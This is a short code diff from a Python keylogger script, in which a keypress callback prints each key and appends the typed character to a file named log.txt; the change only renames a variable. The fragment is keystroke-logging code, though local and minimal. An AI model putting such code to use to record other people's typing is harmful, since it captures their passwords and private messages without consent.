@@ -9,8 +9,8 @@ def keyLogged(key):
     print(str(key))
     with open("log.txt", 'a') as logFile:  # create log.txt file & append with every inputted char
         try:
-            inp = key.char  # get input
-            logFile.write(inp)  # append log file with input
+            inpt = key.char  # get input
+            logFile.write(inpt)  # append log file with input
         except:
             print("N/A")
 
